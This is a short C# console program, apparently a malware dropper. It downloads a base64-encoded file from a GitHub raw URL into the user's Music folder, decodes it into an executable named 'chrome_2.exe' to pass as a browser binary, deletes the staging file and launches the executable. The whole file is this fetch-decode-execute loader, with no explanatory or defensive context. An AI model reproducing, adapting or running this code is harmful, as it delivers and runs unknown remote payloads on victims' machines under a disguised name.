using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace ConsoleApp1;

internal class Program
{
	public static string p = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	public static void donon()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://raw.githubusercontent.com/aliali2131998/gtuhn/main/ss.txt", p + "\\misc.txt");
	}

	private static void Main(string[] args)
	{
		Thread thread = new Thread(donon);
		if (File.Exists(p + "\\misc.txt"))
		{
			File.Delete(p + "\\misc.txt");
			thread.Start();
			thread.Join();
			string s = File.ReadAllText(p + "\\misc.txt");
			if (File.Exists(p + "\\chrome_2.exe"))
			{
				File.Delete(p + "\\chrome_2.exe");
				File.WriteAllBytes(p + "\\chrome_2.exe", Convert.FromBase64String(s));
				File.Delete(p + "\\misc.txt");
			}
			Process.Start(p + "\\chrome_2.exe");
		}
		else
		{
			thread.Start();
			thread.Join();
			File.Delete(p + "\\chrome_2.exe");
			string s2 = File.ReadAllText(p + "\\misc.txt");
			File.WriteAllBytes(p + "\\chrome_2.exe", Convert.FromBase64String(s2));
			File.Delete(p + "\\misc.txt");
			Process.Start(p + "\\chrome_2.exe");
		}
	}
}
